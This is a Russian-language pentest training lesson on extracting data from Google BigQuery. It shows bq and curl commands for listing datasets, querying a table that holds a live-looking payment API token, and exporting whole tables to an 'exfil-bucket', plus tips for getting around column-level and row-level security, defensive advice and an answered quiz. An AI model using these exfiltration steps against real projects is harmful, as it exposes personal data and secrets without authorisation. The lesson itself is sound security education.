---
id: cloud-gcp-bigquery
title: "BigQuery: публичные датасеты, экспорт и утечка данных"
category: cloud
parent: cloud-gcp-data-deep
difficulty: medium
order: 2
tags: [cloud, gcp, bigquery, datasets, exfiltration, sql, analytics]
prerequisites: [cloud-gcp-data-deep, cloud-gcp-iam]
useful_for:
  - "Пентест аналитических платформ GCP"
  - "Поиск публичных датасетов"
  - "Эксфильтрация данных через экспорт"
estimated_minutes: 45
summary: "BigQuery: IAM датасетов, публичные наборы, jobs и экспорт в GCS. Как из аналитического сервиса вытащить данные и секреты, которые там оказались."
---

## Зачем этот урок

BigQuery — аналитическое хранилище GCP. Из-за «аналитического» назначения его часто считают второстепенным и выдают широкие права: `roles/bigquery.dataViewer` на весь проект, `roles/bigquery.jobUser`. Между тем в датасетах лежат выгрузки продакшн-баз, PII, логи, а иногда и токены. Плюс публичные датасеты (в том числе с открытыми данными) позволяют бесплатно делать запросы, а право на экспорт — выкачать данные в GCS. Для атакующего BigQuery — это «данные одним SQL-запросом».

## Модель BigQuery

- **Project → Dataset → Table** — иерархия. Датасет — контейнер таблиц и представлений.
- **IAM** — роли на проект/датасет/таблицу (`roles/bigquery.dataViewer`, `roles/bigquery.dataEditor`, `roles/bigquery.jobUser`, `roles/bigquery.admin`).
- **Job** — выполнение запроса/загрузки/экспорта. `bigquery.jobs.create` — право запускать задания (платно).
- **Public datasets** — `bigquery-public-data` и другие, доступные всем.
- **Authorized views** — представления, дающие доступ к базовой таблице без прав на неё.
- **Datasets из внешних источников** — могут ссылаться на GCS/Sheets.

Права, которые нас интересуют: `bigquery.datasets.get`, `bigquery.tables.getData`, `bigquery.jobs.create`, `bigquery.tables.export`.

## Инструменты и команды

```bash
# Инвентаризация
bq ls --project_id PROJECT_ID
bq ls PROJECT_ID:DATASET

# Информация о датасете (в т.ч. IAM)
bq show --format=prettyjson PROJECT_ID:analytics | jq '.access'

# Публичные датасеты
bq ls bigquery-public-data:

# Запрос данных
bq query --use_legacy_sql=false 'SELECT email, plan FROM `PROJECT_ID.analytics.users` LIMIT 10'

# Экспорт таблицы в GCS
bq extract --destination_format=CSV 'PROJECT_ID:analytics.users' \
  gs://exfil-bucket/users-*.csv

# Список заданий (что делали до нас)
bq ls -j -a --max_results 20

# Через REST с токеном
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://bigquery.googleapis.com/bigquery/v2/projects/PROJECT_ID/datasets" | jq -r '.datasets[].datasetReference.datasetId'
```

## Разобранный пример: чтение датасета и экспорт

Сценарий: у роли есть `roles/bigquery.dataViewer` и `roles/bigquery.jobUser` на проект.

```bash
bq ls PROJECT_ID:
#      datasetId
#  --- --------------
#     analytics
#     billing
#     raw_events

bq query --use_legacy_sql=false \
  'SELECT * FROM `PROJECT_ID.analytics.users` LIMIT 5'
# +----+---------------------+------+---------------------+
# | id | email               | plan | api_token           |
# +----+---------------------+------+---------------------+
# | 1  | admin@example.com   | pro  | sk_live_51H...      |
# +----+---------------------+------+---------------------+

# Выгружаем всю таблицу в GCS
bq extract --destination_format=NEWLINE_DELIMITED_JSON \
  'PROJECT_ID:analytics.users' gs://exfil-bucket/users-*.json
# Waiting on bqjob_r... (0s) Current status: DONE

gsutil ls gs://exfil-bucket/
# gs://exfil-bucket/users-000000000000.json
gsutil cp gs://exfil-bucket/users-000000000000.json /tmp/ && wc -l /tmp/users-000000000000.json
```

В датасете `analytics` обнаружился `api_token` — секрет платёжного провайдера, попавший в таблицу при выгрузке. Такие «случайные» колонки — частая находка.

## Публичные датасеты и authorized views

- **Публичные датасеты** (`bigquery-public-data`) доступны всем; полезны для бесплатного запуска запросов и для разведки (например, поиск утёкших доменов в наборах).
- **Authorized views** — представление в датасете A читает таблицу из датасета B без выдачи прав на B. Если вы получили доступ к представлению, проверьте, не раскрывает ли оно чувствительные столбцы.
- **Материализованные представления** хранят данные и требуют прав на чтение.
- **Row-level security** — фильтрует строки; попробуйте обойти через представление или `tables.getData` на базовой таблице, если права есть.

## Экспорт и эксфильтрация

- `bq extract` → GCS (нужны `bigquery.tables.export` и права на бакет).
- `bq query` с `EXPORT DATA` (SQL-форма) → GCS.
- **Streaming** в свою таблицу: `INSERT INTO` чужой датасет (если есть `dataEditor`) — это запись, будьте осторожны.
- **Datasets из внешних источников**: если таблица ссылается на публичный GCS-объект, данные могут читаться и без прав на BigQuery.
- **BigQuery Omni** — кросс-облачный доступ; проверяйте подключения.

## Обход защит и edge cases

- **CMEK.** Данные, зашифрованные собственным ключом, читаются при наличии `cloudkms.cryptoKeyVersions.useToDecrypt`. Иначе `AccessDenied`.
- **VPC-SC.** Периметр блокирует доступ извне; нужен пивот внутри проекта/VPC.
- **Column-level security (policy tags).** Может скрывать колонки; обход — через представления или `getData` на таблице с более слабой политикой.
- **Row-level security.** Может фильтровать; иногда обходится через `TABLE_QUERY`/представления или запросы с агрегацией.
- **Job user vs data viewer.** `jobUser` без `dataViewer` не даёт читать; наоборот — `dataViewer` без `jobUser` не даёт запускать запросы (но иногда можно через другой сервис).

## Частые ошибки и подводные камни

- Считать BigQuery «просто аналитикой» и не проверять IAM.
- Забыть про экспорт как канал эксфильтрации.
- Игнорировать «случайные» колонки с токенами в таблицах.
- Не проверить authorized views/materialized views.
- Путать права датасета и проекта: `dataViewer` на проекте = все датасеты.

## Защита и детект

- Least privilege: давать доступ к конкретным датасетам, не к проекту.
- Использовать policy tags (column-level) и row-level security для PII.
- Ограничить `bigquery.tables.export` и `bigquery.jobs.create`.
- Включить Cloud Audit Logs (data access) и алертить на массовые `jobs.create`/`tables.export`.
- Не хранить секреты в аналитических таблицах; маскировать токены.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — `dataViewer` на проект. Второй — публичный датасет с чувствительными данными. Третий — открытый экспорт в бакет. Четвёртый — секреты в таблицах. Пятый — authorized view, раскрывающее больше, чем задумано. Все они дают утечку данных «одним запросом».

## Практическое задание

1. Создайте датасет, таблицу с чувствительной колонкой, выдайте `dataViewer` только на датасет.
2. Запустите запрос и экспорт; убедитесь, что без `jobUser` запрос падает.
3. Создайте authorized view и проверьте, что он читает таблицу из другого датасета.
4. Включите audit logs и найдите свои `jobs.create`.

## Что дальше / решение

Из BigQuery достаём выгрузки и секреты. Дальше — использовать токены/данные. Зафиксируйте путь «датасет → экспорт → секреты» в графе. При VPC-SC/CMEK без прав — `blocked`. Если есть только `dataViewer` без `jobUser`, ищите способ запустить запрос через другой сервис (Dataflow, Dataproc).

## Разобранный пример 2: authorized view и column-level security

Предположим, прямой доступ к таблице закрыт, но есть authorized view. Проверяем, не раскрывает ли представление больше, чем задумано.

```bash
# Смотрим определение представления
bq show --format=prettyjson PROJECT_ID:analytics.users_public | jq '.view.query'
# "SELECT id, email, plan FROM `PROJECT_ID.analytics.users`"

# Запрашиваем представление
bq query --use_legacy_sql=false 'SELECT * FROM `PROJECT_ID.analytics.users_public` LIMIT 3'
# +----+-------------------+------+
# | id | email             | plan |
# +----+-------------------+------+
# | 1  | admin@example.com | pro  |
# +----+-------------------+------+

# Проверяем policy tags (column-level security)
bq show --format=prettyjson PROJECT_ID:analytics.users | jq '.schema.fields[] | {name,policyTags}'
# {"name":"api_token","policyTags":{"names":["projects/P/locations/L/taxonomies/T/policyTags/123"]}}
```

Если у роли есть `roles/datacatalog.categoryFineGrainedReader` на policy tag, колонка читается; иначе запрос к ней вернёт ошибку `Access Denied`. Но представление могло быть создано до включения policy tags и теперь «протекает» чувствительную колонку. Также проверяйте `roles/bigquery.dataViewer` на уровне датасета: иногда он есть, а policy tags — нет.

## Практическое задание

1. Создайте два датасета и authorized view между ними; убедитесь, что представление читает чужую таблицу.
2. Включите policy tag на колонку и проверьте, что прямой запрос к ней падает.
3. Создайте представление, обходящее policy tag, и посмотрите, читается ли колонка.
4. Настройте audit logs и найдите запросы к представлению.

## Квиз

```quiz
- question: "Какое право позволяет запускать запросы в BigQuery?"
  options:
    - "bigquery.jobs.create"
    - "bigquery.datasets.get"
    - "storage.objects.list"
    - "logging.logs.list"
  answer: 0
  explanation: "Запрос выполняется как job, для запуска нужно bigquery.jobs.create."
- question: "Как выгрузить таблицу BigQuery в GCS?"
  options:
    - "bq extract / EXPORT DATA (нужны tables.export и права на бакет)"
    - "bq show"
    - "gcloud storage cp"
    - "bq ls"
  answer: 0
  explanation: "Экспорт выгружает данные таблицы в облачное хранилище."
- question: "Что такое authorized view?"
  options:
    - "Представление, читающее таблицу из другого датасета без прямых прав"
    - "Публичный датасет"
    - "Резервная копия"
    - "IAM-роль"
  answer: 0
  explanation: "Authorized view делегирует доступ к базовой таблице через представление."
- question: "Что даёт bigquery.dataViewer на уровне проекта?"
  options:
    - "Чтение всех датасетов проекта"
    - "Только один датасет"
    - "Запись в GCS"
    - "Управление IAM"
  answer: 0
  explanation: "Роль на проекте наследуется на все датасеты."
```

## Где пригодится

- **Пентест GCP:** доступ к аналитическим данным.
- **Bug bounty:** публичные датасеты и утечки.
- **Red team:** получение токенов из таблиц.
- **Data security:** проектирование policy tags и RLS.
